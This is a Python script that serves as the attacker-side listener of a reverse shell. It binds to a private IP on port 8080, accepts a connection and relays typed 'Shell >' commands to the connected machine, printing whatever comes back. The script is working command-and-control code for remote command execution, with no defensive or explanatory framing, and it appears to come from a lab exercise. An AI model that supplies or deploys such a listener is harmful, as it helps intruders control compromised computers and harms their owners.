import socket
import os

def connect():
    print("=" * 50)
    print("[+] Listening for incoming TCP connections on port 8080")
    mySocket = socket.socket()
    mySocket.bind(("192.168.83.128", 8080)) 
    mySocket.listen(1)
    connection, address = mySocket.accept()
    print("=" * 50)
    print(f"Connection established: {address}")
    
    while True:
        try:
            command = input("Shell > ")
            if "terminate" in command:
                connection.send("terminate".encode())
                connection.close()
                break
            else:
                connection.send(command.encode())
                response = connection.recv(5000).decode()
                if not response:  # Empty response could indicate closed connection
                    print("Connection may have been closed by the client")
                    break
                print(response)
        except BrokenPipeError:
            print("Connection lost - the client has disconnected")
            break
        except ConnectionResetError:
            print("Connection was reset by the client")
            break
        except Exception as e:
            print(f"An error occurred: {e}")
            break
    
    # Always ensure the socket is closed properly
    try:
        connection.close()
    except:
        pass

def main():
    try:
        connect()
    except Exception as e:
        print(f"Failed to establish connection: {e}")

if __name__ == "__main__":
    main()
